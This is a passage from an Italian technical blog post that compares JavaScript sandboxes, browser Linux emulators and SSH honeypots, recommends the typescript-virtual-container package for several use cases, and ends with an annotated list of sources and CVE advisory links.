→ `v86` (OS completo, pesante, lento ad avviarsi) o il bundle browser di `typescript-virtual-container` (simulatore, più leggero, avvio istantaneo, include `startxfce4` per un desktop completo che è abbastanza figo per una volta).

**Ti servono tutorial di coding interattivi online o un IDE browser.**
→ WebContainers se sei focalizzato sull'ecosistema Node.js. CheerpX se ti serve un vero userspace Linux. Il bundle browser di `typescript-virtual-container` se vuoi un'opzione più leggera con un'API tipizzata.

**Vuoi raccogliere TTP di attaccanti SSH su larga scala.**
→ Cowrie è lo standard di produzione, punto finale. Gira su qualsiasi server Linux, si integra con tutti i SIEM, ha una modalità LLM ormai. Usa giusto Cowrie.

**Vuoi dati honeypot SSH in un'app Node.js con un'API programmabile.**
→ `typescript-virtual-container`. I comandi girano davvero. Il VFS è una vera struttura dati che puoi istantaneamente catturare e differenziare. L'attaccante ottiene un ambiente interattivo convincente, e tu ottieni dati di audit strutturati senza lasciare Node.

**Ti serve automazione shell / test in CI senza Docker.**
→ `typescript-virtual-container`. Avvio in meno di un secondo, istantanea prima di un test, ripristino dopo. Esegui comandi shell con un'API tipizzata. Niente demone Docker, niente kernel, niente VM, niente attesa.

**Ti servono ambienti shell multi-tenant (SaaS, educazione, formazione).**
→ `typescript-virtual-container`. 5-20 MB per istanza contro 150-256 MB per un emulatore. 100 utenti simultanei: circa 2 GB contro circa 25 GB. È una grossa differenza in costi di hosting!

**Ti serve un honeypot realistico che ti permetta anche di costruire un laboratorio rete multi-VM.**
→ `typescript-virtual-container` è l'unica cosa in questo spazio che fa entrambe.

---

## Cosa non può fare (e voglio essere onesto qui)

Non può eseguire binari x86 nativi. Se devi compilare codice C, eseguire un vero interprete Python, o usare software compilato per Linux, non c'è ABI kernel per sostenere quelle chiamate di sistema. Comandi come `gcc`, `python3`, e `node` sono stub: rispondono a `--version` e alle invocazioni comuni, ma non eseguono niente di reale.

È il compromesso fondamentale: guadagni da 10 a 50 volte meno memoria, un avvio istantaneo, la compatibilità browser, un'API tipizzata, vero SSH, e rete virtuale: e abbandoni la compatibilità binaria con lo userspace Linux.

Fortune ci ha riflettuto molto progettando il progetto. Per i casi d'uso che puntava: honeypot, test, terminali integrati, ambienti CI: eseguire un binario compilato in realtà non serve mai. Pipeline shell, manipolazione di file, routing rete e SSH coprono tutto. Ma se il tuo caso d'uso richiede vero software compilato, `v86` o Docker è la risposta giusta, non questo.

---

## Per concludere

Allora voilà. Questo ecosistema è più ampio e più frammentato di quanto sembri da fuori. `vm` è un separatore di scope, non una sandbox. `vm2` continua ad accumulare CVE (per davvero, guarda gli avvisi di questo mese). `isolated-vm` è la risposta giusta per l'isolamento JS ma solo JS. `quickjs-emscripten` è la scelta giusta quando ti serve compatibilità browser o vuoi evitare estensioni native. `v86` e CheerpX sono veri emulatori quando ti serve vera compatibilità binaria. WebContainers è Node.js in Wasm, non un ambiente Linux generalista. Cowrie è il gold standard degli honeypot SSH, ma è Python e non nativo Node.

E poi c'è `typescript-virtual-container`: il progetto di Fortune: che vive un po' nella sua categoria. Né emulatore, né sandbox JS, né honeypot passivo. Qualcosa in mezzo a tutti che si è rivelato sorprendentemente utile per un sacco di cose che nessuno degli altri può fare.

`typescript-virtual-container` colma il fossato che nessuno degli altri tocca: un ambiente shell Linux completo e programmabile con vero SSH, SFTP, permessi POSIX, gestione utenti, rete virtuale, e un'API TypeScript tipizzata: in esecuzione in circa 10 MB, avvio in meno di un secondo, funzionamento sia in Node.js che nel browser.

Se vuoi provarlo: il codice sorgente è su [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) e c'è una demo online (incluso `startxfce4` per un desktop completo, che è francamente malato) su [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Vai a vederlo e lascia qualche stella a Fortune su GitHub, se le merita!

Grazie di aver letto: questo era lungo anche per i miei standard :) spero ti sia stato utile!

---

## Fonti

Ho provato a collegare ogni affermazione a una fonte primaria: avvisi CVE, doc ufficiali, repo GitHub, post di blog dei manutentori. Qualche nota: la lista dei CVE di vm2 continua ad allungarsi quindi il link FortiGuard potrebbe essere obsoleto al momento in cui leggerai questo (guarda la pagina degli avvisi GitHub per i più recenti). I link Bellard sono tutti stabili: il suo sito personale c'è da sempre e il contenuto non cambia. E se vuoi approfondire uno dei polyfill, basta sfogliare la cartella `polyfills/` nel repo `typescript-virtual-container` direttamente: è più leggibile di qualsiasi descrizione potrei scrivere qui.

### Sandbox JavaScript

- **Modulo `vm` di Node.js**: documentazione ufficiale: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Avviso di sicurezza `vm` di Node.js**: "Il modulo vm non è un meccanismo di sicurezza. Non usarlo per eseguire codice non affidabile": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**: npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Cronologia dei CVE vm2**: allerta FortiGuard con la lista completa dei CVE e date: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**: evasione per errore async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**: Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**: voce Exploit DB con PoC completo: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026**: 11 nuove evasioni, analisi: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**: post-mortem di oxeye.io su CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**: npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Interni V8 Isolate**: guida di integrazione: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**: npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**: npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motore QuickJS**: di Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modello di permessi Deno**: doc: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Uscita Deno 2**: ottobre 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposta TC39 ShadowRealm**: [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposta TC39 Compartments**: [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**: articolo pratico di Andrew Healey sull'approccio sandbox Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emulatori Linux

- **`v86`**: npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matrice di supporto OS v86**: [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS usato da v86): [seabios.org](https://www.seabios.org/SeaBIOS)
- **Estensioni Bochs VBE** (riferimento VGA): [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**: emulatore di Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Note tecniche (TinyEMU, storico, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**: sorgente C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirror GitHub non ufficiali: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**: emulatore JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**: doc: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guida pthread: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**: npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Doc API: [webcontainers.io](https://webcontainers.io) · Annuncio: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Anteprima InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**: GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Post di blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Articolo di Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminale

- **xterm.js**: npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · sito: [xtermjs.org](https://xtermjs.org)
- **node-pty**: npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie**: GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Doc: [docs.cowrie.org](https://docs.cowrie.org) · Sito: [cowrie.org](https://www.cowrie.org/)
- **Kippo**: GitHub (archiviato): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**: GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**: GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**: Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**: honeypot SSH Node.js minimo: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**: lista organizzata: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**: scoperta di informazioni sistema (come gli attaccanti identificano gli honeypot): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo online**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guida di architettura**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementazione del protocollo SSH): npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compressione istantanee VFS): npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (trasporto shell WebSocket): npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Letture complementari

- **Modello di permessi POSIX**: specifica Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (pattern usato nella persistenza VFS): [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modello V8 Isolate**: "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Specifica ISA RISC-V** (per il contesto TinyEMU/JSLinux): [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Architettura OpenRISC 1000**: [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**: Simon Willison TIL, contrasto utile con l'approccio Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**: Simon Willison TIL sulla taglia del bundle quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)

